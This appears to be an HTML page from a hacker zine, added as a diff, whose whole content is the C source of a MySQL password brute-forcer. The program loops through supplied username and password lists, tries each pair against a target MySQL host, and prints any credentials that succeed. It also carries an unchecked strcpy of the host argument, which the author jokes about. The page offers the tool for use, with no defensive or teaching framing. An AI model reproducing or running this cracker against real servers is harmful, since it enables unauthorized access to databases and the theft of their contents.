@@ -1,0 +1,121 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: WarGame/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/WarGame/WarMySQLBrute"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+/* My little mysql bruter :) by WarGame */
+/* you can contact me at: wargame89@yahoo.it */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;mysql/mysql.h&gt;
+
+/* This function will connect to the mysql server */
+int MySqlConnect(char *host,char *user,char *pass)
+{
+	MYSQL mysql;
+	int ret_code = 0;
+
+	if(!mysql_init(&amp;mysql))
+	{
+		printf(&quot;I could not initialize MySQL lib !\n&quot;);
+		exit(EXIT_FAILURE);
+	}
+	
+	
+	if(mysql_real_connect(&amp;mysql,host,user,pass,&quot;&quot;,0,NULL,0))
+	{
+		ret_code = 1;
+	}
+
+	else 
+	{
+		ret_code = 0;
+	}
+
+	mysql_close(&amp;mysql);
+
+	/* return */
+
+	return ret_code;
+}
+
+/* my lame version of chomp() :) */
+void my_chomp(char *str)
+{
+	int str_cnt;
+
+	for(str_cnt = 0;str_cnt &lt; strlen(str);str_cnt++)
+	{
+		if(str[str_cnt] == '\n' || str[str_cnt] == '\r')
+		{
+			str[str_cnt] = '\0';
+		}
+	}
+}
+
+int main(int argc,char *argv[])
+{
+	FILE *user_fd = NULL,*pass_fd = NULL;
+	char current_user[256],current_pass[256],host_to_crack[256];
+	
+	if(!argv[1] || !argv[2] || !argv[3])
+	{
+		printf(&quot;Usage: %s [host] [userlist] [passlist]\n&quot;,argv[0]);
+		printf(&quot;by WarGame\n&quot;);
+		exit(EXIT_FAILURE);
+	}
+
+	/* BoF maniac :) */
+	strcpy(host_to_crack,argv[1]);
+
+	if(!(user_fd = fopen(argv[2],&quot;r&quot;)))
+	{
+		printf(&quot;I could not open userlist !\n&quot;);
+		exit(EXIT_FAILURE);
+	}
+
+	if(!(pass_fd = fopen(argv[3],&quot;r&quot;)))
+	{
+		printf(&quot;I could not open passlist !\n&quot;);
+		exit(EXIT_FAILURE);
+	}
+
+	printf(&quot;Starting cracking on ... [ %s ]\n&quot;,host_to_crack);
+	
+	/* let's start :) */
+        while(!feof(user_fd))
+	{
+		memset(current_user,0,256);
+		fgets(current_user,256,user_fd);
+		my_chomp(current_user);
+	
+		while(!feof(pass_fd))
+		{
+			memset(current_pass,0,256);
+			fgets(current_pass,256,pass_fd);
+			my_chomp(current_pass);
+
+			printf(&quot;Trying -&gt; [%s / %s]\n&quot;,
+					current_user,current_pass);
+
+			if(MySqlConnect(host_to_crack,current_user,
+						current_pass))
+			{
+				printf(&quot;---&gt; GOT! &lt;---\n&quot;);
+				printf(&quot;USERNAME -&gt; [ %s ]\n&quot;,current_user);
+				printf(&quot;PASSWORD -&gt; [ %s ]\n&quot;,current_pass);
+				printf(&quot;------&gt;&lt;------\n&quot;);
+				exit(EXIT_SUCCESS);
+			}
+		}
+		
+		fseek(pass_fd,0,SEEK_SET);
+	}
+
+	fclose(user_fd);
+	fclose(pass_fd);
+	printf(&quot;Nothing :(\n&quot;);
+}
+</pre></body></html>
